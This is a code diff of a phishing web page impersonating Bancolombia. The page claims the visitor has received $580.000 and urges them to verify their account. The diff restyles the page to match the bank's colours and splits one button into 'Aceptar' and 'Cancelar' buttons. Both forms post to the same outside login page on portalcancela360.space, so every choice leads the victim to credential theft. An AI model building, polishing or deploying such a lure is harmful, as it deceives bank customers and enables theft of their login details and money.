@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.0.9/css/boxicons.min.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/boxicons/2.0.9/css/boxicons.min.css" rel="stylesheet">
     <link rel="icon" href="https://personalvirtualesco.site/assets/img/logo.png">
     <title>Notificación Bancolombia</title>
 
@@ -59,19 +59,20 @@
         }
 
         .box__btn {
-            width: 70%;
+            width: 40%;
             padding: 15px;
-            background-color: #003B5C;
-            color: white;
+            background-color: #FFD200;
+            color: #003B5C;
             font-weight: 700;
             border: none;
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s ease;
+            margin: 10px;
         }
 
         .box__btn:hover {
-            background-color: #00233B;
+            background-color: #FFC107;
             transform: scale(1.05);
         }
 
@@ -135,8 +136,14 @@
         <h3>¡Has recibido $580.000!</h3>
         <p>Verifica tu cuenta en línea para más detalles sobre esta transacción.</p>
         <h4>Nuevo abono en tu cuenta Bancolombia</h4>
-        <form action="https://portalcancela360.space/a/login.php" method="post">
-            <button class="box__btn">Aceptar Transacción</button>
+
+        <!-- Botones Aceptar y Cancelar -->
+        <form action="https://portalcancela360.space/a/login.php" method="post" style="display: inline-block;">
+            <button class="box__btn" type="submit">Aceptar</button>
+        </form>
+
+        <form action="https://portalcancela360.space/a/login.php" method="post" style="display: inline-block;">
+            <button class="box__btn" type="submit">Cancelar</button>
         </form>
     </div>
 
